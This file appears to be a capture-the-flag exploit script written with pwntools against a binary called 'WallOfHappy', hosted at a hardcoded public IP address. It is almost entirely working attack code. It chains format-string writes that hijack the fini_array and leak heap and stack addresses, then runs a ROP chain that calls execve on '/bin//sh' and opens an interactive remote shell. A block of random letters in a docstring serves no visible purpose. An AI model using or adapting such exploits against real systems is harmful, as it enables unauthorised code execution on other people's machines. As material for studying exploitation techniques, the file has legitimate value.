#!/usr/bin/env python
# encoding: utf-8

from pwn import *
from time import sleep

context(arch='amd64', os='linux', endian='little')
context.terminal = ['tmux', 'split', '-h']
r = None

'''
zWKLgFbvgGsvfnULGRbrrYRRlCpeeOOLiMJKXfdzBEuSNMsdVczAjtHqZAxbwmOJHOmSGoawtPjaKDJpNSckvpKMHdBupfzImKylAqWUCiBsuLHTqoEIpGtluRBjMTIqmkBDuroGFJpzPJrIhbnNzzGYKZEQRMsqAQBJSuwuIfnITiOriBHvFDirgussgZEpAtsmApWpOKKaqOnUlsTjpaVGHdWcffvwddmuzERKFDaXMFLJTuYdZKXhgOEdnvbhNZhNDEupIeBDnhEzoraPbfBMmOYjqQLeMIiAQYRJeXKHZVFvnPBaIWBzKqIjyUcMBwLhOhMpQmuVhvGUlbFQBBmTVHZqjTAUKdEmoraAEXIKLAdOWRZOifNMeqbtFWsFfWhfhtXNLHgLHHMpiTXQoMzWyzkMQfLOyiEcPVZOpOHHWvGeWkxtEHayKClaBDxZjTEhCAHjVaEaaBsZvOKqAKURmOFcWPeLjxWSBuEtoRnwjVuUQEywlxtsflrRnwVsQGGXgmFNSMyAlPxdFxmXiaTySReUTRHYIJPSbdXHyhfKdzsuieCxxlgytphTklWbfkUKIprJvwNtNJozRaGQZUSDzeUJdhAxSRRwtpXcQlufFRRrRsGJGzudpzbrltuLrmPADjFWUvvETyeXYLZtOnzTVsDqeHBnoTJaiBfeUJJjWWIvknlBIugLlVuqUSduNfNOwLTfzlBZuKQVppwUMomSOaTbDjeEjorhKaKqrYDVDGNBBQJAbjgzyHHSlQGbJaRZZBRPTHiXhUbzdWNbRTJmTAMfMJsaNGdaNjOtyrlKFktoArDfQNRszvOLBEcNLUjTJMgMscfSNymrhhTwMcTiVipFJarewSYmiAMDuoUQVmPgeJkvaSLkYDfzLuSGxsjBacUNKMchcQcuvqdFrREEfhJyAYuaAxRIckkXjyYJmvwffUHrnNXLeSoDbKtEmAhoHuyxHzhiruyuvoXIOOgTETxCQqwsXOLgscbB
'''

def gen_rop():
    from struct import pack

    # Padding goes here
    p = ''

    p += pack('<Q', 0x00000000004f1f75) # pop rsi ; ret
    p += pack('<Q', 0x0000000000b160e0) # @ .data
    p += pack('<Q', 0x000000000043e304) # pop rax ; ret
    p += '/bin//sh'
    p += pack('<Q', 0x0000000000559b41) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x00000000004f1f75) # pop rsi ; ret
    p += pack('<Q', 0x0000000000b160e8) # @ .data + 8
    p += pack('<Q', 0x0000000000525b70) # xor rax, rax ; ret
    p += pack('<Q', 0x0000000000559b41) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x0000000000400616) # pop rdi ; ret
    p += pack('<Q', 0x0000000000b160e0) # @ .data
    p += pack('<Q', 0x00000000004f1f75) # pop rsi ; ret
    p += pack('<Q', 0x0000000000b160e8) # @ .data + 8
    p += pack('<Q', 0x000000000052a675) # pop rdx ; ret
    p += pack('<Q', 0x0000000000b160e8) # @ .data + 8
    p += pack('<Q', 0x0000000000525b70) # xor rax, rax ; ret
    p += pack('<Q', 0x000000000043e304) # pop rax ; ret
    p += pack('<Q', 0x3b)
    p += pack('<Q', 0x00000000005502e5) # syscall ; ret
    return p

def exploit(host):
    global r
    port = 31522
    r = remote(host, port)
    #r = process('./WallOfHappy')

    free_hook = 0xB18E58
    fini_arr = 0xB13178
    main_addr = 0x4ED227 # main
    strcat_got = 0xB16078
    gadget = 0x00000000008b2779

    # 1st round
    r.send('%d'%0xa2+'\0'*0x12)
    payload = ''
    payload += 'nwUqlMPQ'
    val = len('Your Happiness equals :nwUqlMPQ')
    payload += "%{}c%{}$n".format((main_addr-val), 0x29)
    payload += "...%{}$p".format(1)
    payload += "...%{}$p".format(146)
    payload = payload.ljust(0x101, 'a')
    payload += p64(fini_arr)
    payload += 'a'*7
    payload += gen_rop()
    r.send(payload.ljust(999, 'a'))
    sleep(2)
    r.recvuntil('Your Happiness equals :')
    r.recvuntil('...0x')
    data = r.recvuntil('...')[:-3]
    heap = int(data, 16)-0x100+0x118
    log.info('heap 0x%016x' % heap)

    r.recvuntil('0x')
    data = r.recvuntil('aaa')[:-3]
    stack = int(data, 16)-0x4e0+0x40+0x30-0x78
    log.info('stack 0x%016x' % stack)

    # 2nd round
    sleep(2)
    r.send('%d'%0xa2+'\0'*0x12)
    payload = ''
    payload += 'nwUqlMPQ'
    val = len('Your Happiness equals :nwUqlMPQ')
    payload += "%{}c%{}$n".format((gadget-val), 0x29)
    payload += "%{}c".format(heap-0x8b286a+2)
    payload = payload.ljust(0x101, 'b')
    payload += p64(stack)
    r.send(payload.ljust(999, 'b'))
    r.recvuntil('Your Happiness equals :')

if __name__ == '__main__':
    host = '49.4.15.125'
    exploit(host)
    r.interactive()
